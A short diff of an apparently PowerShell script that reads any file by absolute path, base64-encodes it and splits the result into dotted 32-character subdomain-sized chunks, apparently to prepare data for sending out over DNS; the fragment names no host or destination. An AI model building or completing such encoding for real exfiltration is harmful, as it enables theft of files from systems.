@@ -66,7 +66,7 @@ filter chunks($c) { $t = $_; 0..[math]::floor($t.length / $c) | % { $t.substring
 filter dots($c) { ($_ -replace "([\w]{$c})", "`$1.").trim('.') } ; $SubdomainLength = 32 ; $Base=0 ; $script:base = $Base
 
 # Data Input 
-if ($Payload -like "$pwd*") { $b64Payload = [Convert]::ToBase64String([IO.File]::ReadAllBytes($Payload)) }
+if ($Payload -like "*:\*") { $b64Payload = [Convert]::ToBase64String([IO.File]::ReadAllBytes($Payload)) }
 else { $b64Payload = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($Payload)) } 
 $Extension = $Payload.Split('.')[1] ; $Payload = $b64Payload
 
